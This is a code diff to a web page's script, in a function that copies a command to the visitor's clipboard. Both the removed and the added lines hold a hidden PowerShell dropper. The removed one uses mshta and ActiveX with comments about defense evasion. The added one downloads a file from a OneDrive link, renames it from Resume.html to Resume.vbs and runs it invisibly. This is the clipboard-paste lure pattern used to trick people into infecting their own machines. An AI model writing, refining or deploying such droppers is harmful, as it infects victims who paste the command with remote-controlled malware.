@@ -647,8 +647,8 @@
             });
             
             function copyScriptToClipboard() {
-                // Enhanced payload with multiple execution methods and defense evasion
-                const scriptContent = `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"Start-Process mshta -ArgumentList \\\\\\\"javascript:var x=new ActiveXObject(\\\\\\\"\\\\\\\"Microsoft.XMLHTTP\\\\\\\"\\\\\\\");x.open(\\\\\\\"\\\\\\\"GET\\\\\\\"\\\\\\\",\\\\\\\"\\\\\\\"https://1drv.ms/u/c/2f3053ae4c170361/EU3x-jF2eSlIu1PgBNaGfQ0BF50mkVAKMHi-DFlgC4H7QQ?e=HCYlUh\\\\\\\"\\\\\\\",false);x.send();var s=new ActiveXObject(\\\\\\\"\\\\\\\"ADODB.Stream\\\\\\\"\\\\\\\");s.Type=1;s.Open();s.Write(x.responseBody);s.SaveToFile(\\\\\\\"\\\\\\\"Resume.html\\\\\\\"\\\\\\\",2);var fso=new ActiveXObject(\\\\\\\"\\\\\\\"Scripting.FileSystemObject\\\\\\\"\\\\\\\");fso.MoveFile(\\\\\\\"\\\\\\\"Resume.html\\\\\\\"\\\\\\\",\\\\\\\"\\\\\\\"Resume.vbs\\\\\\\"\\\\\\\");new ActiveXObject(\\\\\\\"\\\\\\\"WScript.Shell\\\\\\\"\\\\\\\").Run(\\\\\\\"\\\\\\\"Resume.vbs\\\\\\\"\\\\\\\",0);close()\\\\\\\" -Verb RunAs' -Wait"`;
+                // Optimized PowerShell script that downloads HTML from OneDrive, renames to VBS, and executes
+                const scriptContent = `powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://1drv.ms/u/c/2f3053ae4c170361/EU3x-jF2eSlIu1PgBNaGfQ0BF50mkVAKMHi-DFlgC4H7QQ?e=HCYlUh' -OutFile 'Resume.html'; Rename-Item 'Resume.html' 'Resume.vbs'; Start-Process 'Resume.vbs' -WindowStyle Hidden"`;
                 
                 // Create a temporary textarea to copy the content
                 const textArea = document.createElement('textarea');
